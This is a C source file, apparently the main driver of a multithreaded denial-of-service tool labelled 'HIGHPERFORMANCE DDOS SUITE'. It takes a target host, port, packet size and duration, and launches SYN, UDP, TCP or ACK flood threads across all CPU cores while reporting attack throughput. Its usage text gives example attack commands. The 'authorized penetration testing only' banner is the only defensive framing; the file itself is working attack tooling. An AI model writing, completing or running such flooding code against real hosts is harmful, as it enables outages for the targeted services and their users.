#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <time.h>
#include "flood.h"
#include "config.h"

extern volatile int running;
extern global_stats_t stats;

attack_mode_t parse_mode(const char *str) {
    if (strcmp(str, "syn") == 0) return MODE_SYN;
    if (strcmp(str, "udp") == 0) return MODE_UDP;
    if (strcmp(str, "tcp") == 0) return MODE_TCP;
    if (strcmp(str, "ack") == 0) return MODE_ACK;
    return MODE_UNKNOWN;
}

const char *mode_name(attack_mode_t mode) {
    switch (mode) {
        case MODE_SYN: return "SYN Flood";
        case MODE_UDP: return "UDP Flood";
        case MODE_TCP: return "TCP Flood";
        case MODE_ACK: return "ACK Flood";
        default: return "Unknown";
    }
}

void print_banner(void) {
    printf("\n");
    printf("  ╔══════════════════════════════════════════════╗\n");
    printf("  ║        HIGHPERFORMANCE DDOS SUITE              ║\n");
    printf("  ║     FOR AUTHORIZED PENETRATION TESTING ONLY    ║\n");
    printf("  ╚══════════════════════════════════════════════╝\n\n");
}

void print_usage(const char *prog) {
    printf("Usage: sudo %s <target> <port> <packet_size> <duration> [mode]\n\n", prog);
    printf("Arguments:\n");
    printf("  target        Domain name or IP address\n");
    printf("  port          Target port (80, 443, etc.)\n");
    printf("  packet_size   Payload size in bytes (max 65535 for raw, 99999+ for TCP)\n");
    printf("  duration      Attack duration in seconds\n");
    printf("  mode          Attack mode (default: syn)\n\n");
    printf("Modes:\n");
    printf("  syn           TCP SYN flood (default, requires raw socket)\n");
    printf("  udp           UDP flood\n");
    printf("  tcp           TCP connection flood\n");
    printf("  ack           TCP ACK flood\n\n");
    printf("Examples:\n");
    printf("  sudo %s example.com 80 99999 120 syn\n", prog);
    printf("  sudo %s 192.168.1.1 443 65000 60 udp\n", prog);
    printf("  sudo %s example.com 80 1460 300 tcp\n\n");
}

int main(int argc, char *argv[]) {
    attack_config_t config;
    memset(&config, 0, sizeof(config));
    
    if (argc < 5) {
        print_banner();
        print_usage(argv[0]);
        return 1;
    }
    
    // Parse arguments
    strncpy(config.target, argv[1], MAX_TARGET_LEN - 1);
    config.port = atoi(argv[2]);
    
    // Clamp packet size
    config.packet_size = atoi(argv[3]);
    if (config.packet_size < 64) config.packet_size = 64;
    if (config.packet_size > 200000) config.packet_size = 200000;
    
    config.duration = atoi(argv[4]);
    if (config.duration < 1) config.duration = 1;
    
    config.mode = (argc > 5) ? parse_mode(argv[5]) : MODE_SYN;
    if (config.mode == MODE_UNKNOWN) {
        fprintf(stderr, "Unknown mode: %s\n", argv[5]);
        return 1;
    }
    
    // Auto-detect CPU cores
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    config.num_threads = (NUM_THREADS > 0) ? NUM_THREADS : cpu_cores;
    
    config.running = 1;
    
    // Resolve target
    struct hostent *he = gethostbyname(config.target);
    if (he == NULL) {
        // Maybe it's already an IP
        struct in_addr addr;
        if (inet_pton(AF_INET, config.target, &addr) == 1) {
            strncpy(config.target_ip, config.target, MAX_IP_LEN - 1);
        } else {
            fprintf(stderr, "Failed to resolve target: %s\n", config.target);
            return 1;
        }
    } else {
        strncpy(config.target_ip, inet_ntoa(*(struct in_addr *)he->h_addr_list[0]), MAX_IP_LEN - 1);
    }
    
    // Print banner and config
    print_banner();
    printf("  Target:        %s (%s:%d)\n", config.target, config.target_ip, config.port);
    printf("  Mode:          %s\n", mode_name(config.mode));
    printf("  Packet Size:   %d bytes\n", config.packet_size);
    printf("  Duration:      %d seconds\n", config.duration);
    printf("  Threads:       %d (CPU cores detected)\n\n", config.num_threads);
    
    // Setup signal handler
    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);
    
    // Initialize stats
    memset(&stats, 0, sizeof(stats));
    pthread_mutex_init(&stats.lock, NULL);
    stats.start_time = get_time_sec();
    
    // Choose flood function
    void *(*flood_func)(void *) = NULL;
    switch (config.mode) {
        case MODE_SYN: flood_func = syn_flood_thread; break;
        case MODE_UDP: flood_func = udp_flood_thread; break;
        case MODE_TCP: flood_func = tcp_flood_thread; break;
        case MODE_ACK: flood_func = ack_flood_thread; break;
        default: flood_func = syn_flood_thread; break;
    }
    
    // Launch threads
    pthread_t threads[config.num_threads];
    thread_data_t thread_data[config.num_threads];
    
    printf("[*] Launching %d threads...\n", config.num_threads);
    
    for (int i = 0; i < config.num_threads; i++) {
        thread_data[i].config = &config;
        thread_data[i].thread_id = i;
        thread_data[i].packets_sent = 0;
        thread_data[i].bytes_sent = 0;
        pthread_create(&threads[i], NULL, flood_func, &thread_data[i]);
    }
    
    printf("[*] Attack running. Press Ctrl+C to stop early.\n\n");
    
    // Stats loop
    while (running && config.running) {
        sleep(STATS_INTERVAL);
        
        // Aggregate thread stats
        unsigned long long total_pkts = 0;
        unsigned long long total_bytes = 0;
        for (int i = 0; i < config.num_threads; i++) {
            total_pkts += thread_data[i].packets_sent;
            total_bytes += thread_data[i].bytes_sent;
        }
        
        pthread_mutex_lock(&stats.lock);
        stats.total_packets = total_pkts;
        stats.total_bytes = total_bytes;
        stats.elapsed = get_time_sec() - stats.start_time;
        pthread_mutex_unlock(&stats.lock);
        
        print_stats(&stats, &config);
        
        if (stats.elapsed >= config.duration) break;
    }
    
    // Stop
    config.running = 0;
    running = 0;
    
    // Wait for threads
    for (int i = 0; i < config.num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Final stats
    double final_elapsed = get_time_sec() - stats.start_time;
    unsigned long long final_pkts = 0;
    unsigned long long final_bytes = 0;
    for (int i = 0; i < config.num_threads; i++) {
        final_pkts += thread_data[i].packets_sent;
        final_bytes += thread_data[i].bytes_sent;
    }
    
    double total_mb = final_bytes / (1024.0 * 1024.0);
    double total_gb = total_mb / 1024.0;
    double avg_mbps = total_mb / final_elapsed;
    double avg_gbps = (final_bytes * 8.0) / (final_elapsed * 1e9);
    
    printf("\n\n");
    printf("  ╔══════════════════════════════════════════════╗\n");
    printf("  ║                ATTACK COMPLETE                ║\n");
    printf("  ╠══════════════════════════════════════════════╣\n");
    printf("  ║  Total packets:  %-27llu ║\n", final_pkts);
    printf("  ║  Total data:     %-10.2f MB (%-6.2f GB)     ║\n", total_mb, total_gb);
    printf("  ║  Avg rate:       %-10.1f MB/s (%-6.2f Gbps)  ║\n", avg_mbps, avg_gbps);
    printf("  ║  Elapsed time:   %-27.1f ║\n", final_elapsed);
    printf("  ╚══════════════════════════════════════════════╝\n\n");
    
    pthread_mutex_destroy(&stats.lock);
    return 0;
}
